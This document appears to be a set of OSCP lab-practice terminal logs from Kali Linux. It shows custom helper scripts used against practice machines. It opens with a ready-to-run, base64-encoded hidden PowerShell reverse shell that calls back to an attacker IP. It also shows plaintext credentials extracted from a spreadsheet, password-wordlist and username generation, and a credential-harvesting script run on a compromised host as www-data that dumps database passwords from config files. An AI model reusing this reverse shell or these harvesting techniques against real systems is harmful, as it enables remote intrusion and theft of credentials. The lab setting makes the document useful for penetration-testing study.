```shell
┌──(kali㉿kali)-[~/OSCP]
└─$ python3 silly.liner-PS.py -i 192.168.45.200 -p 443

Generated PowerShell reverse shell command:
--------------------------------------------------
powershell -nop -w hidden -e CgAkAGMAbABpAGUAbgB0ACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAQwBQAEMAbABpAGUAbgB0ACgAIgAxADkAMgAuADEANgA4AC4ANAA1AC4AMgAwADAAIgAsADQANAAzACkAOwAKACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AAoAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwAKAHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewAKACAAIAAgACAAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsACgAgACAAIAAgACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAKQA7AAoAIAAgACAAIAAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAKACAAIAAgACAAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAKACAAIAAgACAAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7AAoAIAAgACAAIAAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQAKAH0AOwAKACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAAoA
--------------------------------------------------

Encoded payload only:
--------------------------------------------------
JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMAAwACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=
```

```shell
┌──(kali㉿kali)-[~/OSCP/Prep/31.BillyBoss]
└─$ python3 ~/OSCP/silly-encoder.py 
=== Password List Encoder ===

Wordlist Source:
1. Use default rockyou.txt
2. Use custom wordlist file

Select wordlist source (1 or 2): 2
Enter full path to custom wordlist: /home/kali/OSCP/Prep/31.BillyBoss/wordlists.txt

Select encoding type:
1. Base64
2. Hex
3. URL Encoding
4. ASCII Decimal
5. Binary
6. ROT13
7. Reverse

Enter type (1-7): 1
How many times you want to encode it?: 1
Enter output file path: /home/kali/OSCP/Prep/31.BillyBoss/wordlists_encoded.txt

Additional Options:
1. Apply URL encoding to final result (default: Yes)
2. Skip URL encoding
Apply URL encoding? (1 or 2): 1

Using wordlist: /home/kali/OSCP/Prep/31.BillyBoss/wordlists.txt
Encoding with Base64 x1
Final output will be URL encoded

✓ Done! Encoded 20 passwords to /home/kali/OSCP/Prep/31.BillyBoss/wordlists_encoded.txt
  Wordlist: /home/kali/OSCP/Prep/31.BillyBoss/wordlists.txt
  Encoding: Base64 x1
  Final step: URL encoding
  Output size: 0 bytes
```


```shell
┌──(kali㉿kali)-[~/OSCP/Prep/Escape-Two]
└─$ python3 xml2csv.py accounts_extracted/xl/worksheets/sheet1.xml accounts_extracted/xl/sharedStrings.xml out.csv
Parsing worksheet: accounts_extracted/xl/worksheets/sheet1.xml
Using shared strings: accounts_extracted/xl/sharedStrings.xml
CSV saved to: out.csv
Dimensions: 5 rows × 5 columns
```

```csv
First Name,Last Name,Email,Username,Password
Angela,Martin,angela@sequel.htb,angela,0fwz7Q4mSpurIt99
Oscar,Martinez,oscar@sequel.htb,oscar,86LxLBMgEWaKUnBG
Kevin,Malone,kevin@sequel.htb,kevin,Md9Wlq1E5bZnVDVo
NULL,NULL,sa@sequel.htb,sa,MSSQLP@ssw0rd!
```

```names.txt
Matthew Harrison
Emma Miah
Rebecca Bell
Scott Gardner
Terry Edwards
Holly Matthews
Anne Jenkins
Brett Naylor
Melissa Mitchell
Craig Carr
Fiona Clark
Patrick Martin
Kate Watson
Kirsty Norris
Andrea Hayes
Abigail Hughes
Melanie Watson
Frances Ward
Sylvia King
Wayne Hartley
Iain White
Joanna Wood
Bethan Webster
Elaine Brady
Christopher Lewis
Megan Johnson
Damien Chapman
Joanne Lewis
```

```shell
┌──(kali㉿kali)-[~/OSCP/Prep/28.Nagoya]
└─$ python3 silly-username.py -i names.txt -o usernames.txt
Processing 28 names...
Generated 672 unique usernames to usernames.txt
```

```shell
www-data@pebbles:/tmp$ chmod +x silly-harvester.sh 
www-data@pebbles:/tmp$ ./silly-harvester.sh 
[+] Starting Database Credential Hunt...
[+] Scanning:  /var/www /etc /home /opt /root /var/lib /srv /usr/local /var/www/html
[+]------------------------------------------------
[+] Found 377 files. Grepping...
/etc/apache2/sites-available/default-ssl.conf:79:               #        file needs this password: `xxj31ZMTZzkVA'.
/etc/debconf.conf:69:#BindPasswd: secret
/etc/debconf.conf:70:#KeyByKey: 0
/etc/hdparm.conf:87:# security_pass = password
/etc/mysql/my.cnf:104:# ssl-key=/etc/mysql/server-key.pem
/etc/mysql/mysql.conf.d/mysqld.cnf:104:# ssl-key=/etc/mysql/server-key.pem
/etc/nsswitch.conf:7:passwd:         compat
/etc/overlayroot.conf:135:#     crypt:dev=/dev/vdb,pass=somepassword,mkfs=0
/etc/overlayroot.conf:138:#      $ MAPNAME="secure"; DEV="/dev/vdg"; PASSWORD="foobar"
/etc/overlayroot.conf:42:#    are comma delimited key=value pairs.
/etc/overlayroot.conf:49:#     * pass: default: ""
/etc/overlayroot.conf:54:#       mapname=mapper,pass=foo,fstype=ext4,mkfs=1
/etc/overlayroot.conf:67:#      crypt:mapname=mapper,pass=foo,fstype=ext4,mkfs=1,dev=vdb
/etc/overlayroot.conf:68:#      crypt:mapname=mapper,pass=foo,fstype=ext3,mkfs=1,dev=/dev/disk/by-label/my-jumpdrive,timeout=120
/etc/ssl/openssl.cnf:113:# input_password = secret
/etc/ssl/openssl.cnf:114:# output_password = secret
/etc/ssl/openssl.cnf:157:challengePassword              = A challenge password
/etc/ssl/openssl.cnf:337:signer_key     = $dir/private/tsakey.pem # The TSA private key (optional)
/etc/ssl/openssl.cnf:45:database        = $dir/index.txt        # database index file.
/etc/ssl/openssl.cnf:55:private_key     = $dir/private/cakey.pem# The private key
/etc/systemd/logind.conf:21:#HandlePowerKey=poweroff
/etc/systemd/logind.conf:22:#HandleSuspendKey=suspend
/etc/systemd/logind.conf:23:#HandleHibernateKey=hibernate
/etc/vmware-tools/guestproxy-ssl.conf:5:encrypt_key             = no
/etc/zm/zm.conf:38:ZM_DB_HOST=localhost
/etc/zm/zm.conf:41:ZM_DB_NAME=zm
/etc/zm/zm.conf:44:ZM_DB_USER=root
/etc/zm/zm.conf:47:ZM_DB_PASS=ShinyLucentMarker361
/var/www/auth/index.php:28:                                                     <td><b>Password:</b></td>
/var/www/auth/index.php:5:      $password = $_POST['password'];
[+]------------------------------------------------
[+] Done.
www-data@pebbles:/tmp$
```
